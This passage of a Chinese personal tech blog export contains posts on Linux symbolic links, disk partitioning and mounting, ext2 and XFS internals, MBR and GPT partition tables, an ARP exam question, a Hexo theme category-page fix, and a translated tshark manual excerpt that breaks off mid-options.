2.2符号链接符号链接就是建立一个独立的文件，而这个文件会让数据的读取指向它连接的那个文件的文件名 当源文件被删除后，符号链接的文件就会打不开。类似于是Windows下的快捷方式 需要注意的是，通过符号链接进入到了某个目录或是打开了某个文件。操作的对象实际上还是原始文件。所以你在符号链接里面打开了东西，进行了操作，那原始文件也会发生改变。如果你在符号链接里面把内容删除了，相当于原始文件的实际内容也删除了。 123456[root@vultr tmp]# ln -s test zhangshuaiyang 加上-s就是符号链接，不加是硬链接[root@vultr tmp]# ll -itotal 4 11618 -rw-r--r-- 2 root root 0 Apr 18 06:16 test 11618 -rw-r--r-- 2 root root 0 Apr 18 06:16 zhang 23193 lrwxrwxrwx 1 root root 4 Apr 18 06:43 zhangshuaiyang -&gt; test 3.磁盘分区、格式化、检验及挂载如果想在系统里面新增一块硬盘，操作过程如下： 对磁盘进行划分，进行磁盘分区 对分区进行格式化，以建立文件系统 对文件系统进行检验（可选） 在linux系统上，建立一个挂载点（目录），把该文件系统挂载上来 3.1查看磁盘分区状态lsblk（list block device）显示出所有存储设备 12345678910111213141516[root@vultr tmp]# lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsr0 11:0 1 1024M 0 rom vda 253:0 0 10G 0 disk └─vda1 253:1 0 10G 0 part /#name表示设备文件名，会省略/dev等前面的目录；disk表示一整块磁盘；part表示分区#在vda这个磁盘下，有一个分区vda1----------------------------------------------------------[root@vultr tmp]# lsblk -ipf 通过-f选项可以列出UUIDNAME FSTYPE LABEL UUID MOUNTPOINT/dev/sr0 /dev/vda `-/dev/vda1 ext4 19c82273-828c-4d85-bc4e-6fc269acc524 /-----------------------------------------------------------[root@vultr tmp]# blkid 通过blkid也可以显示出UUID/dev/vda1: UUID="19c82273-828c-4d85-bc4e-6fc269acc524" TYPE="ext4" parted列出磁盘的分区表类型及分区信息 123456789[root@vultr tmp]# parted /dev/vda printModel: Virtio Block Device (virtblk)Disk /dev/vda: 10.7GBSector size (logical/physical): 512B/512BPartition Table: msdos #分区表格式，比如MBR/GPT，这里显示的是msdosDisk Flags: #下面内容是分区数据Number Start End Size Type File system Flags 1 1049kB 10.7GB 10.7GB primary ext4 boot 3.2磁盘分区MBR分区表使用fdisk工具进行，GPT分区表使用gdisk工具进行。 3.3磁盘格式化所谓格式化，其实是指在分区上创建文件系统。使用的命令是mkfs（make filesystem） 如果我们要创建的文件系统是xfs。那么命令的写法就是mkfs.xfs。例如mkfs.xfs /dev/vda4，表示在/dev/vda4这个分区上建立一个xfs文件系统。 如果是创建ext4文件系统。则命令写法是mkfs.ext4。只是xfs的文件系统建立起来速度更快。 想知道能创建哪些文件系统。只要再命令行中输入mkfs[tab][tab]，就能看到了。 3.4文件系统的挂载注意点： 单一文件系统不要被重复挂载到不同的挂载点中 单一目录不要重复挂载多个文件系统 作为挂载点的目录，最好是空目录 12345[root@vultr tmp]# blkid /dev/vda1: UUID="19c82273-828c-4d85-bc4e-6fc269acc524" TYPE="ext4" [root@vultr tmp]# mount UUID="19c82273-828c-4d85-bc4e-6fc269acc524" /data/ext4其中UUID表示文件系统的ID。/data/ext4表示挂载点。也就是说把这个文件系统挂载在/data/ext4目录下。]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[文件系统]]></title>
    <url>%2F2019%2F04%2F30%2F%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[文件系统柱面通常是分区及文件系统的最小单位。当然如果使用GPT格式的分区表，最小单位可以为扇区 磁盘分区完后，要进行格式化，使之成为操作系统能用的文件系统 文件（或目录）包含属性（比如文件权限，文件属性）及内容 权限与属性 实际数据 inode表 数据区块 区块有放置inode表的区块，有放置数据的数据区块，以及记录整个文件系统整体信息的超级区块 超级区块：记录inode和数据区块总量、使用量、剩余量及文件系统格式等 inode：记录文件属性，一个文件占一个inode，同时记录文件对应数据所放置的区块号码 数据区块：记录实际内容，当一个区块占不下的时候，就会占用多个数据区块 索引式文件系统，包含了inode。通过inode，我们可以数据存放在哪些数据区块里面，所以可以一次性全部提取出来。该方式性能比较好，比如linux的ext2文件系统 再比如u盘一般使用FAT文件系统，这种就不是索引式文件系统。它没有inode，所以无法把数据一次性全提取出来。每个区块号码都记录在前一个区块里面，所以提取的时候得一个连着一个提取。 碎片整理，在非索引式文件系统里面，由于有时候数据写入的区块太过于分散，所以读取的时候性能会很差，通过磁盘碎片整理，可以把同一个文件的区块集合在一起，这样读取起来就比较容易。 1.ext2文件系统在分区上进行格式化的时候，就已经规划好了inode和数据区块 把放置inode的区块和数据区块全部都放一起，会导致很难管理 所以在ext2的文件系统上，会弄出多个区块群组，每个区块群组都有自己的inode，数据区块和超级区块 在文件系统最前面有个启动扇区，里面可以存放启动引导程序。（注：或是想到之前的磁盘分区，分区的第一个扇区用来放MBR，MBR中的446字节来存放启动引导程序） 这种设计可以把引导启动程序放在不同文件系统的最前端，而不必把程序全都放在整个磁盘唯一的MBR下。 1.1数据区块数据区块用来放置文件数据。ext2文件系统支持的区块大小有1k，2k及4k共3种。 每个区块都有编号，方便inode表记录。 数据放在数据区块里面，如果数据的大小要小于区块的容量的话，就会造成浪费。 1.2inode表inode表记录如下内容 该文件的读写属性（读、写、执行） 文件所有者及用户组 文件大小 文件建立或状态改变时间 最近一次读取时间 最近修改时间 定义文件特征标识 文件真正内容指向 inode表的数量和大小在格式化的时候就确定好了 每个inode表大小为128B（其中4B来记录一个数据区块的位置编号，一共能记录12个） 每个文件仅占用一个inode表 文件系统能建立的文件数量和inode数量有关 系统读取文件先找到inode表，分析文件记录用户及权限是否符合，如果符合最后才去找数据区块读取 1.3超级区块没有超级区块，就没有文件系统，它记录整个文件系统相关信息。 数据区块与inode的总量 未使用与已经使用的inode与数据区块的数量 数据区块与inode的大小 文件系统的挂载时间、最近一次写入数据时间等文件系统相关信息 一个有效位数值，文件系统被挂载，则有效位为0，未被挂载则为1 123# 显示目前系统被格式化的设备[root@vultr ~]# blkid/dev/vda1: UUID="19c82273-828c-4d85-bc4e-6fc269acc524" TYPE="ext4" 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667[root@vultr ~]# dumpe2fs /dev/vda1dumpe2fs 1.42.9 (28-Dec-2013)Filesystem volume name: &lt;none&gt;Last mounted on: /Filesystem UUID: 19c82273-828c-4d85-bc4e-6fc269acc524Filesystem magic number: 0xEF53Filesystem revision #: 1 (dynamic)Filesystem features: has_journal ext_attr resize_inode dir_index filetype needs_recovery extent 64bit flex_bg sparse_super large_file huge_file uninit_bg dir_nlink extra_isizeFilesystem flags: signed_directory_hash Default mount options: user_xattr aclFilesystem state: clean #文件系统状态，clean表示没问题Errors behavior: ContinueFilesystem OS type: LinuxInode count: 640000 #inode总数Block count: 2621179 #区块总数Reserved block count: 131057 #保留的区块总数Free blocks: 2026205 #还有多少可用区块Free inodes: 599345 #还有多少可用inodeFirst block: 0Block size: 4096 #单个区块大小Fragment size: 4096Group descriptor size: 64Reserved GDT blocks: 248Blocks per group: 32768Fragments per group: 32768Inodes per group: 8000Inode blocks per group: 500Flex block group size: 16Filesystem created: Wed Dec 5 17:22:49 2018Last mount time: Wed Apr 10 10:10:48 2019Last write time: Wed Apr 10 10:10:46 2019Mount count: 4Maximum mount count: -1Last checked: Sat Mar 9 02:38:28 2019Check interval: 0 (&lt;none&gt;)Lifetime writes: 3452 MBReserved blocks uid: 0 (user root)Reserved blocks gid: 0 (group root)First inode: 11Inode size: 256 #inode表大小Required extra isize: 28Desired extra isize: 28Journal inode: 8Default directory hash: half_md4Directory Hash Seed: 6cbf0c8a-63c4-43df-aaba-cd82ae9cb153Journal backup: inode blocksJournal features: journal_incompat_revoke journal_64bitJournal size: 32MJournal length: 8192Journal sequence: 0x0004f118Journal start: 7195Group 0: (Blocks 0-32767) [ITABLE_ZEROED] #区块组0所占区块号码为0-32767 Checksum 0x6f25, unused inodes 0 Primary superblock at 0, Group descriptors at 1-2 #文件系统描述说明在1-2号区块内 Reserved GDT blocks at 3-250 Block bitmap at 251 (+251), Inode bitmap at 267 (+267) #区块对照表和inode对照表在251和267区块内 Inode table at 283-782 (+283) #一个inode表占256B，总共有782-283+1=500个区块，一个区块大小占4KB。所以inode的总数是500*4kB/256B #以下几行记录，记录了可用的区块数，及可用的inode表述。可知，inode表为0了。 19990 free blocks, 0 free inodes, 1728 directories Free blocks: 11866, 11890-11922, 11928-11935, 11943-11951, 12249, 12313, 12350, 12832-32767 Free inodes: ……后续省略…… 2.文件系统与目录树的关系2.1目录在文件系统上创建一个目录时，文件系统会分配一个inode与至少一块区块（里面记录了子目录及文件的inode表位置编号）给目录 2.2文件在文件系统上创建一个文件时，文件系统会分配一个inode及所需个数的数据区块。 2.3目录树的读取文件存放在目录下，所以我们得要先知道该目录所对应的区块。区块里面记录了子目录及文件的inode表号。找到我想要的文件所对应的inode表号，再去找该文件的inode。找到之后就知道该文件放置在哪个区块了。 3.挂载文件系统和目录树结合的操作称为挂载 挂载点一定是目录，该目录为进入文件系统的入口 文件系统要挂载在目录树的某个目录后，我们才能使用该文件系统 4.XFS文件系统ext文件系统的支持度虽然广，但是格式化所需要时间长。因为是预先就规划好了inode和区块的位置，所以后续可以直接使用，也就是说并没有使用动态配置的做法 现在的磁盘越来越大，对于虚拟化磁盘那就更大了。对于巨型文件要考虑性能问题，不然虚拟磁盘的处理效率就会差。 xfs是一个日志式文件系统，用于高容量磁盘及高性能文件。同时还几乎有ext4文件系统有的功能。此外，inode与区块都是需要时才动态配置产生，不会预分配，所以格式化操作会很快。 4.1数据区包含inode、数据区块、超级区块等数据，类似于之前ext里面的区块群组 4.2文件系统活动登陆区用来记录文件系统的变化，有点像日志区 4.3实时运行区当有文件要被建立时，xfs会在这个区段里找一个到数个的扩展区块，将文件放置在这个区块内，等分配完毕再写入到数据区的inode与区块中。]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[磁盘分区]]></title>
    <url>%2F2019%2F04%2F30%2F%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[磁盘分区1.磁盘分区磁盘包含：碟片（细分为扇区和磁道）、机械手臂、磁头、主轴马达 扇区大小分为512B和4KB 1.1第一个扇区（MBR）磁盘第一个扇区存放启动引导程序和磁盘分区表（格式分为MBR[Windows支持]和GPT） MBR（master boot record） 启动引导程序 磁盘分区表 主引导记录容量（512B） 446B 64B MBR分区表的限制： 分区最多到2TB MBR仅占一个扇区，被破坏后，很难恢复甚至无法恢复 MBR内的启动引导程序只有446B，无法存储较多的程序代码 1.1.1MBR磁盘分区表 分区表占64B，给磁盘划分分区，其实就是对这个分区表做设置 分区表默认最多把一个磁盘分为4个分区 分区分为主要分区和扩展分区 要写入数据到磁盘时，会参考这个分区表 1.1.2MBR扩展分区由于磁盘分区表的限制，最多给磁盘划分出4个分区。那么我们可以利用额外的扇区来记录更多的分区信息。 在扩展分区的某个地方来记录在扩展分区里面的其他逻辑分区信息 扩展分区最多一个 逻辑分区是在扩展分区里面划分出来的 能格式化的是主要分区和逻辑分区，扩展分区不能被格式化 逻辑分区能划分多少个，依据不同操作系统来定 1.2GPT磁盘分区表现在的磁盘越来越大，如果使用磁盘阵列等技术，那么在Linux平台下看到的磁盘大小可能就有几十个TB。使用MBR格式，要划分分区时，就要2TB/2TB地划分下去。这就可能划分出好几十个分区，为了解决这个问题，就有了GPT这种磁盘分区的格式。 以前扇区大小为512B，现在已经有了4KB的扇区。为兼容所有磁盘，会使用到逻辑区块地址LBA（logical block address），LBA默认是512B。在GPT这种格式下，将磁盘的所有区块使用LBA来规划。可以理解为，如果一个扇区的容量是512B，然后LBA默认是512B的话，那么一个扇区就是一个区块。如果一个扇区容量是4KB=8*512B，那么一个区块地址就是1/8扇区 第一个LBA称为LBA0 MBR使用第一个扇区来记录，而GPT使用了前34个LBA区块来记录。由于MBR只有一个区块，破坏就难以恢复。不同于MBR，GPT中会用磁盘的最后34个LBA做备份。 1.2.1LBA0（MBR兼容区块） LBA0 引导启动程序 特殊标志符 逻辑区块地址0 446B 64B，表示磁盘使用GPT格式 1.2.2LBA1（GPT表头记录）记录磁盘分区表本身的位置和大小，同时记录了备份的GPT分区位置。 1.2.3LBA2-33（实际记录分区信息处）从LBA2区块开始，每个LBA可以记录4组分区记录。所以一个磁盘在默认情况下，可以划分4*32=128个分区。 在MBR中，分区表的大小是64B，而在GPT中是512B。 一个区块记录4组分区，所以在GPT的分区表中，一组分区记录可以占512/4=128B的空间大小。 在这128B的空间中使用64bit来记录开始和结束的扇区号码 每个分区的最大容量限制就是：$2^{64}*512B=8ZB$ 2.启动程序CMOS是一个嵌入在主板的存储器，存储着各项硬件参数 BIOS是一个写入到主板的固件（固件是写入到硬件上的一个软件程序） 计算机系统在启动时，主动执行的第一个程序就是BIOS BIOS执行后，会分析计算机里面的存储设备。比如发现了硬盘，BIOS就去找那个能启动的硬盘 找到该硬盘，就读取第一个扇区的MBR位置，找到那个446B的启动引导程序 以上BIOS的任务完成，接下来就是启动引导程序干活了 启动引导程序的目的是加载内核文件 加载完后，启动引导程序的活也干完了 之后就是内核文件开始工作，再之后就是把任务都交给我们熟悉的操作系统完成]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[软考试题1]]></title>
    <url>%2F2019%2F04%2F29%2F%E8%BD%AF%E8%80%83%E8%AF%95%E9%A2%981%2F</url>
    <content type="text"><![CDATA[问题若主机hostA的MAC地址为aa-aa-aa-aa-aa-aa，主机hostB的MAC地址为bb-bb-bb-bb-bb-bb。由hostA发出的查询hostB的MAC地址的帧格式如下图所示，则此帧中的目标MAC地址为（ D ），ARP报文中的目标MAC地址为（ C ）。 问题1选项 A aa-aa-aa-aa-aa-aa B bb-bb-bb-bb-bb-bb C 00-00-00-00-00-00 D ff-ff-ff-ff-ff-ff 问题2选项 A aa-aa-aa-aa-aa-aa B bb-bb-bb-bb-bb-bb C 00-00-00-00-00-00 D ff-ff-ff-ff-ff-ff 解析 数据包从上往下层层封装。在wireshark里面是可以看到其封装情况的。 上图就是一个arp的数据包。在中间的框中，可以知道arp报文被Ethernet（以太网）头部封装。第一个包指的是arp广播请求包，意思是“谁知道192.168.0.1的mac地址，请告诉192.168.0.114“ wireshark数据包中以太网帧头部（Ethernet）包含了destination（目标mac地址），source（源mac地址），type（类型） 问题一里面的目的mac指的就是以太网头部里面的mac地址。 即下图中写的目标mac地址，你能看到正好就是对应wireshark数据包中的destination这段。 问题二里面，ARP报文中的目标MAC地址，指的就是wireshark数据包中，红框的target mac address。arp报文是被mac头部封装的。 sender mac address表示发送方自己的mac地址； sender ip address表示发送方自己的ip地址； target mac address表示想要知道的对方的mac地址是多少，由于是广播请求，此时并不知道对方mac，所以暂时以全0替代； target ip address表示请求对方的ip地址。]]></content>
      <categories>
        <category>软考</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[设置分类列表页]]></title>
    <url>%2F2019%2F04%2F27%2F%E8%AE%BE%E7%BD%AE%E5%88%86%E7%B1%BB%E5%88%97%E8%A1%A8%E9%A1%B5%2F</url>
    <content type="text"><![CDATA[设置分类列表页问题最近通过github+hexo(ocean主题)搭建了博客。期间遇到了各种问题，主要还是因为自己不是程序员，有些代码看不懂。 比如我想，以后如果文章多起来，只有一个归档可不行，最好要有个分类的界面。把文章都整理好，以后也方便自己查东西。 照着网上的操作： 先生成一个分类的网页，输入命令hexo new page categories 找到对应网页的md文件，在其头部内添加上type: &quot;categories&quot; 最后测试，新建一篇文章，在文章md文件头部上添加categories: 分类的名称 保存 最后需要在主页上把分类页展现出来。 找到主题配置文件_config.yml。在meun中加入分类: /categories 保存 上述操作做完之后，查看效果。发现文章里面是有分类的显示 但是，在主页里面点击分类的连接，进入分类网页，没有任何显示。如下图红框处，最开始是没有任何显示的. 解决方法网上查了大量文章，很多都只是说了配置问题，我是按配置正确操作的，但是就是解决不了。 后来看到一篇文章，猜测出应该是这个ocean主题缺少对应的代码。 参考链接：hexo主题开发指南-分类列表页与分类文章列表页 分类列表页显示博客里的所有分类，分类文章列表页显示某个分类中的文章列表。 Hexo 并没有专门分类列表页的模板，那该如何处理呢？一般是写在页面模板中，即 layout/page.swig 里，然后判断页面类型变量 page.type，如果是 categories，则显示分类列表页。再在博客里创建一个页面，指定其 type 为 categories ocean主题是用ejs写出来的。而这个链接里面给的是swig的代码。所以估计不能直接用 定位了问题，接下来就好处理了。由于我暂时还不会写代码，所以只好找答案复制粘贴。 参考链接：Hexo-创建分类（categories）和标签（tags）首页，给出如下代码 找到 layout/_partial/article.ejs 然后找到 &lt;div class=&quot;article-entry&quot; itemprop=&quot;articleBody&quot;&gt; 这一行 这个 div 里面的内容全部替换为：(注：再此处，我没有全部替换，而是补充接在原始文档内容后了) 123456789101112131415161718192021222324252627282930313233343536373839&gt; &lt;% if (page.type === "tags") &#123; %&gt;&gt; &lt;div class="tag-cloud"&gt;&gt; &lt;div class="tag-cloud-title"&gt;&gt; &lt;%- _p('counter.tag_cloud', site.tags.length) %&gt;&gt; &lt;/div&gt;&gt; &gt; &lt;div class="tag-cloud-tags"&gt;&gt; &lt;%- tagcloud(&#123;&gt; min_font: 12,&gt; max_font: 30,&gt; amount: 200,&gt; color: true,&gt; start_color: '#ccc',&gt; end_color: '#111'&gt; &#125;) %&gt;&gt; &lt;/div&gt;&gt; &lt;/div&gt;&gt; &gt; &lt;% &#125; else if (page.type === 'categories') &#123; %&gt;&gt; &gt; &lt;div class="category-all-page"&gt;&gt; &lt;div class="category-all-title"&gt;&gt; &lt;%- _p('counter.categories', site.categories.length) %&gt;&gt; &lt;/div&gt;&gt; &gt; &lt;div class="category-all"&gt;&gt; &lt;%- list_categories() %&gt;&gt; &lt;/div&gt;&gt; &gt; &lt;/div&gt;&gt; &gt; &lt;% &#125; else &#123; %&gt;&gt; &gt; &lt;% if (post.excerpt &amp;&amp; index)&#123; %&gt; &lt;%- post.excerpt %&gt;&gt; &lt;% &#125; else &#123; %&gt;&gt; &lt;%- post.content %&gt;&gt; &lt;% &#125; %&gt;&gt; &lt;% &#125; %&gt;&gt; 修改样式，如果觉得不好看，自己改喜欢的样式 找到 yilia/source/css/_partial/article.styl 在最后面添加下面的 css 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&gt; /*tag-cloud*/&gt; .tag-cloud &#123;&gt; text-align: center;&gt; margin-top: 50px;&gt; &#125;&gt; .tag-cloud a &#123;&gt; display: inline-block;&gt; margin: 10px;&gt; &#125;&gt; .tag-cloud-title &#123;&gt; font-weight: 700;&gt; font-size: 24px;&gt; &#125;&gt; .tag-cloud-tags &#123;&gt; margin-top: 15px;&gt; a &#123;&gt; display: inline-block;&gt; text-decoration: none;&gt; font-weight: normal;&gt; font-size: 10px;&gt; color: #fff;&gt; line-height: normal;&gt; padding: 5px 5px 5px 10px;&gt; position: relative;&gt; border-radius: 0 5px 5px 0;&gt; font-family: Menlo, Monaco, "Andale Mono", "lucida console", "Courier New", monospace;&gt; &amp;:hover &#123;&gt; opacity: 0.8;&gt; &#125;&gt; &amp;:before &#123;&gt; content: " ";&gt; width: 0;&gt; height: 0;&gt; position: absolute;&gt; top: 0;&gt; left: -18px;&gt; border: 9px solid transparent;&gt; &#125;&gt; &amp;:after &#123;&gt; content: " ";&gt; width: 4px;&gt; height: 4px;&gt; background-color: #fff;&gt; border-radius: 4px;&gt; box-shadow: 0 0 0 1px rgba(0, 0, 0, .3);&gt; position: absolute;&gt; top: 7px;&gt; left: 2px;&gt; &#125;&gt; &#125;&gt; a.color1 &#123;&gt; background: #FF945C;&gt; &amp;:before &#123;&gt; border-right-color: #FF945C;&gt; &#125;&gt; &#125;&gt; a.color2 &#123;&gt; background: #F5C7B7;&gt; &amp;:before &#123;&gt; border-right-color: #F5C7B7;&gt; &#125;&gt; &#125;&gt; a.color3 &#123;&gt; background: #BA8F6C;&gt; &amp;:before &#123;&gt; border-right-color: #BA8F6C;&gt; &#125;&gt; &#125;&gt; a.color4 &#123;&gt; background: #CFB7C4;&gt; &amp;:before &#123;&gt; border-right-color: #CFB7C4;&gt; &#125;&gt; &#125;&gt; a.color5 &#123;&gt; background: #7B5D5F;&gt; &amp;:before &#123;&gt; border-right-color: #7B5D5F;&gt; &#125;&gt; &#125;&gt; &#125;&gt; &gt; /*category-all-page*/&gt; .category-all-page &#123;&gt; margin-top: 50px;&gt; .category-all-title &#123;&gt; font-weight: 700;&gt; font-size: 24px;&gt; text-align: center;&gt; &#125;&gt; .category-list-item:after &#123;&gt; content: '';&gt; clear: both;&gt; display: table;&gt; &#125;&gt; .category-list-count &#123;&gt; float: right;&gt; margin-left: 5px;&gt; &#125;&gt; .category-list-count:before &#123;&gt; content: '一共 ';&gt; &#125;&gt; .category-list-count:after &#123;&gt; content: ' 篇文章';&gt; &#125;&gt; &#125;&gt; 通过上述操作，问题解决。不过显示出来的样式不是自己喜欢的那种。等以后自己学会编程，再回头过来修改吧～]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[tshark使用方法]]></title>
    <url>%2F2019%2F04%2F26%2Ftshark%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[tshark使用方法tshark官方文档 1.介绍TShark is a network protocol analyzer. It lets you capture packet data from a live network, or read packets from a previously saved capture file, either printing a decoded form of those packets to the standard output or writing the packets to a file. TShark‘s native capture file format is pcapng format, which is also the format used by wireshark and various other tools. TShark是一个网络分析工具。它能帮你在实时网络中捕获数据包，或是从预先保存好的捕获文件中读取数据包，或是打印出这些数据包的解码形式到标准输出，再或是把数据包写入到一个文件中。TShark的本地捕获文件格式是pcapng格式，这种pcapng格式也被wireshark和多种其他工具使用。 Without any options set, TShark will work much like tcpdump. It will use the pcap library to capture traffic from the first available network interface and displays a summary line on the standard output for each received packet. 如果没有设置任何选项，TShark将像tcpdump一样工作。它使用pcap库，从第一个可使用的网络接口捕获流量。并且为每个接收到的包展示其摘要行到标准输出上。 When run with the -r option, specifying a capture file from which to read, TShark will again work much like tcpdump, reading packets from the file and displaying a summary line on the standard output for each packet read. TShark is able to detect, read and write the same capture files that are supported by Wireshark. The input file doesn’t need a specific filename extension; the file format and an optional gzip compression will be automatically detected. Near the beginning of the DESCRIPTION section of wireshark(1) or https://www.wireshark.org/docs/man-pages/wireshark.html is a detailed description of the way Wireshark handles this, which is the same way Tshark handles this. 当使用-r选项，会从我们指定的文件中读取数据包信息。TShark将再次像tcpdump一样工作，从文件中读取数据包并且把读取的数据包在标准输出上展示其摘要行。TShark可以检测，读取和写入同一份捕获文件，这些操作在Wireshark中也是支持的。输出文件不需要一个指定的文件扩展名；它将动态检测文件格式和可选的gzip压缩。在Wireshark的开始描述部分附近或是在链接https://www.wireshark.org/docs/man-pages/wireshark.html 中，介绍了关于Wireshark处理这些问题的方法细节描述，这些方法同样适用于TShark。 Compressed file support uses (and therefore requires) the zlib library. If the zlib library is not present when compiling TShark, it will be possible to compile it, but the resulting program will be unable to read compressed files. 支持压缩文件要使用（因此需要）zlib库。如果编译TShark时zlib库不存在，也可以编译它，但是最终程序将不可读取压缩文件。 When displaying packets on the standard output, TShark writes, by default, a summary line containing the fields specified by the preferences file (which are also the fields displayed in the packet list pane in Wireshark), although if it’s writing packets as it captures them, rather than writing packets from a saved capture file, it won’t show the “frame number” field. If the -V option is specified, it instead writes a view of the details of the packet, showing all the fields of all protocols in the packet. If the -O option is specified, it will only show the full details for the protocols specified, and show only the top-level detail line for all other protocols. Use the output of “tshark -G protocols“ to find the abbreviations of the protocols you can specify. If the -P option is specified with either the -V or -O options, both the summary line for the entire packet and the details will be displayed. 当在标准输出显示数据包时，默认情况下TShark输出摘要行信息，摘要行里包含首选项文件指定的字段（这些字段也展示在wireshark中的包列表窗），但是如果在捕获流量时输出数据包而不是在保存的文件中输出数据包的话，将不会显示“帧编号”字段。如果指定了-V选项，这将输出数据包的细节信息视图，展示了数据包中所有协议的所有字段信息。如果指定了-O选项，它将仅显示指定协议的完整详细信息，并仅显示所有其他协议的顶级详细信息行。在命令行中输入“tshark -G protocols”可以查找指定的协议缩写。如果-P选项和-V或-O一起使用，将会展示整个包的摘要行和细节信息。 Packet capturing is performed with the pcap library. That library supports specifying a filter expression; packets that don’t match that filter are discarded. The -f option is used to specify a capture filter. The syntax of a capture filter is defined by the pcap library; this syntax is different from the read filter syntax described below, and the filtering mechanism is limited in its abilities. 数据包捕获时使用pcap库。pcap库支持指定的过滤表达式；数据包没有匹配上过滤表达式则会被丢弃。-f选项被用来指定捕获过滤表达式。捕获过滤的语法在pcap库中定义；这些捕获过滤的语法不同于以下所描述的显示过滤器语法，并且其过滤机制的能力有限。 Read filters in TShark, which allow you to select which packets are to be decoded or written to a file, are very powerful; more fields are filterable in TShark than in other protocol analyzers, and the syntax you can use to create your filters is richer. As TShark progresses, expect more and more protocol fields to be allowed in read filters. Read filters use the same syntax as display and color filters in Wireshark; a read filter is specified with the -R option. 在TShark中的显示过滤器允许你选择哪一个包被解码或是把该数据包写入到一个文件，这是很强大的功能；TShark相比于其他协议分析器可以过滤出更多的字段，并且你能使用并创建的过滤器语法更为丰富。随着TShark的发展，期待更多协议字段被允许出现在显示过滤器中。显示过滤器使用与wireshark中的展示和色彩过滤器一样的语法；使用-R选项来指定显示过滤器。 Read filters can be specified when capturing or when reading from a capture file. Note that that capture filters are much more efficient than read filters, and it may be more difficult for TShark to keep up with a busy network if a read filter is specified for a live capture, so you might be more likely to lose packets if you’re using a read filter. 当正在捕获或是从一个捕获文件中读取时是可以指定显示过滤器的。需要注意的是捕获过滤器比显示过滤器会更有效率；并且在一个繁忙的网络中如果进行实时捕获时使用了显示过滤器，那么TShark可能更难跟上这个繁忙网络，同时你要是使用了显示过滤器还可能会丢失数据包。 A capture or read filter can either be specified with the -f or -R option, respectively, in which case the entire filter expression must be specified as a single argument (which means that if it contains spaces, it must be quoted), or can be specified with command-line arguments after the option arguments, in which case all the arguments after the filter arguments are treated as a filter expression. If the filter is specified with command-line arguments after the option arguments, it’s a capture filter if a capture is being done (i.e., if no -r option was specified) and a read filter if a capture file is being read (i.e., if a -r option was specified). 捕获或是显示过滤器能分别使用-f或是-R选项来指定。在这种情况下，整个过滤表达式必须作为一个参数被指定（这意味着如果含有空格，就需要使用“ ”被引用）；或者是在选项参数之后使用命令行参数被指定，在这种情况下，所有在过滤器参数之后的参数会被视为过滤表达式。如果在选项参数后，使用命令行参数来指定过滤器，那么捕获正在进行时它就是捕获过滤器（即，没有-r选项）；如果捕获文件正在被读取，那么它就是显示过滤器（即，-r选项是被指定的）。 If the -w option is specified when capturing packets or reading from a capture file, TShark does not display packets on the standard output. Instead, it writes the packets to a capture file with the name specified by the -w option. 当正在捕获数据包，或是从一个捕获文件中读取时，如果使用了-w选项，那么TShark不会在标准输出上显示数据包。相反，它将把数据包写入捕获文件，其名称由-w选项指定。 If you want to write the decoded form of packets to a file, run TShark without the -w option, and redirect its standard output to the file (do not use the -w option). 如果要将解码后的数据包形式写入文件，那么使用TShark时不要带上-w选项，同时会将其标准输出重定向到文件。（不要使用-w选项） If you want the packets to be displayed to the standard output and also saved to a file, specify the -P option in addition to the -w option to have the summary line displayed, specify the -V option in addition to the -w option to have the details of the packet displayed, and specify the -O option, with a list of protocols, to have the full details of the specified protocols and the top-level detail line for all other protocols to be displayed. If the -P option is used together with the -V or -O option, the summary line will be displayed along with the detail lines. 如果你想数据包在标准输出上显示并且还能保存到一个文件中，那么除了-w选项还需要指定-P选项来显示摘要行。使用-w选项及-V选项将展示数据包的细节。如果再加上-O选项，带上了列出的协议，将显示指定协议的所有细节以及所有其他协议的顶层细节行。如果-P选项和-V或是-O选项一起使用，那么摘要行将会和细节信息一起展示。 When writing packets to a file, TShark, by default, writes the file in pcapng format, and writes all of the packets it sees to the output file. The -F option can be used to specify the format in which to write the file. This list of available file formats is displayed by the -F option without a value. However, you can’t specify a file format for a live capture. 当把数据包写入一个文件，TShark默认情况下会使用pcapng格式，并将其所有看到的包写入到输出文件。使用-F选项可以指定输出文件的格式。使用-F选项不带任何参数值，将显示可以得到的文件格式列表。但是对于实时捕获，你不能指定其文件格式。 When capturing packets, TShark writes to the standard error an initial line listing the interfaces from which packets are being captured and, if packet information isn’t being displayed to the terminal, writes a continuous count of packets captured to the standard output. If the -q option is specified, neither the continuous count nor the packet information will be displayed; instead, at the end of the capture, a count of packets captured will be displayed. If the -Q option is specified, neither the initial line, nor the packet information, nor any packet counts will be displayed. If the -q or -Q option is used, the -P, -V, or -O option can be used to cause the corresponding output to be displayed even though other output is suppressed. 当正在捕获数据包时，TShark把捕获到数据包接口的初始化行写入到标准错误中。如果数据包信息没有被展示在终端，则将写入连续的捕获数据包统计到标准输出。如果-q选项被指定，则不管是连续统计还是数据包信息都不会被展示出来；相反，在捕获结束后，被捕获的数据包统计将会显示出来。如果-Q选项被指定，初始化行、数据包信息或是任何一个数据包统计都不会被展示。如果使用-q或-Q选项，则可以使用-P，-V或-O选项来显示相应的输出，即使其他输出被抑制也是如此。 When reading packets, the -q and -Q option will suppress the display of the packet summary or details; this would be used if -z options are specified in order to display statistics, so that only the statistics, not the packet information, is displayed. 读取数据包时，-q和-Q选项将禁止显示数据包摘要或详细信息;如果指定-z选项以显示统计信息，那么只有统计信息会被展示，而不会展示数据包信息。 The -G option is a special mode that simply causes Tshark to dump one of several types of internal glossaries and then exit. -G选项是一种特殊模式，它只会导致TShark转储几种类型的内部词汇表中的一种，然后退出。 2.选项概要Capture interface: 123456789-i &lt;interface&gt; # 